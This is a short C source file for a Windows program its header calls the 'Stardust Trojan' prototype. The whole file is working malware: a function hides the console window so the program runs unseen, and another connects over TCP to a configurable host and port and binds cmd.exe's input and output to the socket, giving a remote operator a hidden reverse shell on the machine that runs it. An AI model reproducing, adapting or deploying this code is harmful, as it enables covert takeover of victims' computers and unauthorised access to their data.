/* ============ Stardust Trojan - Ver. 0.1.1 [Prototype] =============
   =                Coded by Falsedeer in 2022/12/21                 =
   =================================================================== */

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>

// link the lib of winsock2 to the output obj file
#pragma comment(lib, "ws2_32.lib")

// global variable
#define HOST "127.0.0.1"
#define PORT 4444

// function declaration
void Stealth(void);
void RevShell(void);

// entrypoint of stardust
int main(void){
	Stealth();
	RevShell();
	return 0;
}

// DESC: stay stealth, don't create console, just run in background 
void Stealth(void){
	HWND hdlr; // windows handler
	
 	AllocConsole();
 	hdlr = FindWindowA("ConsoleWindowClass", NULL);
 	ShowWindow(hdlr, SW_HIDE);
 	return;
}

// DESC: spawn a reverse shell piping input / output to  socket connection
void RevShell(void){
	WSADATA wsa;
	SOCKET tcpsock;
	SOCKADDR_IN server;
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION processinfo;
	char cmdpath[250];
	
	WSAStartup(MAKEWORD(2, 2), &wsa); // use winsock ver 2.2
	tcpsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // use tcp
	server.sin_family = AF_INET; // specify protocol
	server.sin_port = htons(PORT); // specify port
	server.sin_addr.s_addr = inet_addr(HOST); // specify server

	// connection start
	connect(tcpsock, (struct sockaddr *)&server, sizeof(server));
	
	// get the path of the environment variable 
	if (GetEnvironmentVariable("COMSPEC", cmdpath, sizeof(cmdpath)) == 0){
		goto exit;
	} 
	
	// set the startupinfo for createprocess
	memset(&startupinfo, 0, sizeof(startupinfo));
	startupinfo.cb = sizeof(startupinfo);
	startupinfo.dwFlags = (STARTF_USESTDHANDLES);
	startupinfo.hStdInput = (HANDLE)tcpsock;
	startupinfo.hStdOutput = (HANDLE)tcpsock;
	startupinfo.hStdError = (HANDLE)tcpsock;
	
	// process start
	if (CreateProcess(NULL, cmdpath, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupinfo, &processinfo) == 0){
		goto exit;
	} else {
		// wait for the created process to end before exiting and cleaning up
		WaitForSingleObject(processinfo.hProcess, INFINITE);
	}

exit:
	CloseHandle(processinfo.hProcess);
	CloseHandle(processinfo.hThread);
	closesocket(tcpsock);
	WSACleanup();
	return;
}